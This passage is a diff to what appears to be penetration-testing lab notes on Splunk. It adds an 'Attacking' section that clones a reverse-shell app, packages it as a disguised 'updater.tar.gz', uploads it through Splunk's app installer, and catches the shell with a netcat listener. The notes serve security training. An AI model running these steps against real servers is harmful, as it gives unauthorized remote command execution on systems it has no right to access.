@@ -5,3 +5,15 @@ Here we can see that Nmap identified the `Splunkd httpd` service on port 8000 an
 
 If able to log in, one can browse data, run reports, create dashboards and install applications. `https://10.129.201.50:8000/en-US/app/launcher/home`
 Aside from this built-in functionality, Splunk has suffered from various public vulnerabilities over the years, such as this [SSRF](https://www.exploit-db.com/exploits/40895) that could be used to gain unauthorized access to the Splunk REST API.
+
+# Attacking
+```bash
+git clone https://github.com/0xjpuff/reverse_shell_splunk.git
+cd reverse_shell_splunk
+
+# Changing the run.ps1 to the correct IP information.
+tar -cvzf updater.tar.gz splunk_shell/
+```
+
+Going to the `Apps` settings one can install an app in the top right corner `Install app from file`.
+Before uploading have a `nc` listener `sudo nc -lnvp 443`.
